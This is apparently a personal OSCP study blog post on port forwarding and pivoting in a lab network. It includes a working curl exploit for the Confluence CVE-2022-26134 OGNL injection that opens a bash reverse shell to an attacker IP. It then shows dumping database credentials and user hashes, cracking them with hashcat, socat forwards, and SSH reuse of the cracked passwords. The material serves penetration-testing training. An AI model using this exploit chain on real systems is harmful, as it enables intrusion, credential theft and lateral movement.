---
title: Port Redirection and SSH Tunneling
date: 2024-03-25 09:49:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Port Redirection and SSH Tunneling tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Port Redirection and SSH Tunneling

Most networks are not flat. Flat networks are defined by all devices communicating freely with eachother. No such thinkg as limited access to eachother, regardless of if the access is really needed for bare operations. However, flat networks are a goldmine for attackers.

More secure networks are Segmented, meaning they are broken down into smaller networks, called subnets. The subnets each have a group of devices with a specific purpose who are only granted access to other subnets and hosts when absolutely necessary. Most network admins that follow this would also implement controls limiting traffic flow, like Firewalls. Firewalls can be implemented at the software level of an endpoint, like the Linux kernal iptables tool suite or Windows Defender Firewall, or they can be a part of or a dedicated physical device.

Port redirection (generic term for types of port forwarding) and tunneling are ways we can traverse these security boundaries. Port redirection lets us modify the flow of data so packets send to one socket will be taken and passed to another socket. Tunneling is encapsulating one type of data stream inside another, like transporting HTTP traffic in an SSH connection. Enternally, only the SSH traffic would be visible.

## Port Forwarding with Linux Tools

We need to configure hosts to listen on one port and relay all packets received to another destination.

### Simple Port Forwarding

Imagine we had a Linux web server running Confluence that was vulnerable to CVE-2022-26134, which is a pre-auth remote code execution vuln. We can exploit this for a reverse shell.

During enum, we see the server has 2 network interfaces - one on the same network as our Kali machine, and another on an internal subnet. In the Confluence config file, we found creds and and the IP and port for a PostgreSQL database instance on a server in that internal submet. We want to use these creds to access the db and do further enum.

CONFLUENCE01 is in both the WAN that kali is in, and the DMZ where the SQL db is. There is a socket on the SQL db listening on TCP port 5432 (the default PostgreSQL server port).


### Setting Up

To access CONFLUENCE01, we'll use the command injection vuln i nthe app to get a reverse shell. A Rapid7 post shows a cURL command to exploit the vulnerability.

```console
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

This is a verbose curl request to http://10.0.0.28:8090, the vulnerable Confluence server, which has URL encoded the URL path. You should decode the URL to see what the payload does.

NOTE: You can quickly URL decode strings by selecting Decode As... > URL in the Decoder tab in Burp,6 or using an online tool such as [CyberChef](https://gchq.github.io/CyberChef/).

```console
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

This URL path is an OGNL injection (Object-Graph Notation Language - used in Java apps) that uses Java's ProcessBuilder class to spawn a Bash reverse shell. OGNL injections can happen when an app handles user input such that it gets passed to the OGNL expression parser. It's possible to execute Java code within OGNL expressions, so we can exploit this to execute arbitrary code. 

Change the parameters to match our vulnerable CONFLUENCE01 server and Kali attacker machine.

```console
curl http://VULNERABLECONFLUENCEIP:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/KALIATTACKERIP/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Start a nc listener before exploiting.

```console
$ nc -nlvp 4444

$ curl http://VULNERABLECONFLUENCEIP:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/KALIATTACKERIP/4444%200%3E%261%27%29.start%28%29%22%29%7D/

confluence@confluence01:/opt/atlassian/confluence/bin$ id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)

// we are running with privs of the confluence user, which is quite limited
// so start some enum

confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:fb:5d brd ff:ff:ff:ff:ff:ff
    inet 192.168.226.63/24 brd 192.168.226.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:bf:46:85 brd ff:ff:ff:ff:ff:ff
    inet 10.4.226.63/24 brd 10.4.226.255 scope global ens224
       valid_lft forever preferred_lft forever

// confluence has 2 interfaces: ens192 and ens224

confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.226.254 dev ens192 proto static 
10.4.226.0/24 dev ens224 proto kernel scope link src 10.4.226.63 
192.168.226.0/24 dev ens192 proto kernel scope link src 192.168.226.63 

// so we should be able to access hosts in the 192.168.50.0/24 subnet through the ens192 interface, and hosts in the 10.4.50.0/24 subnet through the ens224 interface

// look at confluence config file

confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
...
   <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.226.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...

// above we found the ip to the db server and the plaintext username and password
```

We can use these creds to auth to the database. However, CONFLUENCE01 doesn't hsve a PostgreSQL client on it. Since we're low privileged, we can't install it. But, we have psql on Kali. However, it can't connect to PGDATABASE01 from Kali, since it's only routable from CONFLUENCE01.

In this case, there is no firewall between Kali and CONFLUENCE01, so we can bind the ports on the WAN interface of CONFLUENCE01 and connect to them from Kali. We need to create a port forward on CONFLUENCE-1 that listens to a port on the WAN interface, and we will forward all packets recieved on that port to the PGDATABASE01 on the internal subnet usig tools like Socat.

### Port Forwarding with Socat

Let's open TCP port 2345 on the WAN interface of CONFLUENCE01, and connect to the port from Kali. All packets that we send to this port, we want forwarded by CONFLUENCE01 to port 5432 on PGDTABASE01. After this, we can connect to TCP port 2345 on CONFLUENCE01 just like we would be connecting directly to port 5432 on PGDATABASE01.

Assume we have Socat already installed on CONFLUENCE01 here, but if it is not, you can download and run a statically-linked binary version instead. 

On CONFLUENCE-1, start Socat:

```console
// this listens on TCP port 2345, forks into a new subprocess when it receives a connection. instead of dying after a single conn, then forwards all traffic to TCP port 5432 on PGDATABASE01.

$ socat -ddd TCP-LISTEN:2345,fork TCP:PGDATABASEIP:5432
<cat -ddd TCP-LISTEN:2345,fork TCP:10.4.226.215:5432   
2024/03/27 03:06:04 socat[3787] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2024/03/27 03:06:04 socat[3787] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2024/03/27 03:06:04 socat[3787] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2024/03/27 03:06:04 socat[3787] I setting option "fork" to 1
2024/03/27 03:06:04 socat[3787] I socket(2, 1, 6) -> 5
2024/03/27 03:06:04 socat[3787] I starting accept loop
2024/03/27 03:06:04 socat[3787] N listening on AF=2 0.0.0.0:2345
```

Now, run psql on Kali. We found the password earlier.

```console
$ psql -h CONFLUENCE01IP -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

We have access to the PostgreSQL db now. WE also have access to the confluence database. Continue enumeration.

```console
# \c confluence

# select * from cwd_user;

// this is several rows of user information, including their password hash
```

Crack the password hashes you found from the last command with Hashcat. Put the credentials all in one file. The Hashcat mode number for Atlassian (PBKDF2-HMAC-SHA1) hashes2 is 12001.

```console
$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt

{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
```

If you get password matches, you should suspect that they are used other places in the network. Imagine the PGDATABASE01 is running an SSH server too. Use the cracked creds against that.

Kill your first Socat session first. 

```console
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:PGDATABASEIP:22
```

Now, instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

Use SSH client to connect to 2222 on CONFLUENCE01 with database_admin.

```console
$ ssh database_admin@CONFLUENCEIP -p2222

database_admin@pgdatabase01:~$ whoami
database_admin
```

Additional Tools: 

    - rinetd3 is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.

    - We can combine Netcat and a FIFO4 named pipe file to create a port forward.5

    - If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to /proc/sys/net/ipv4/conf/[interface]/forwarding (if it's not already configured to allow it).


## SSH Tunneling
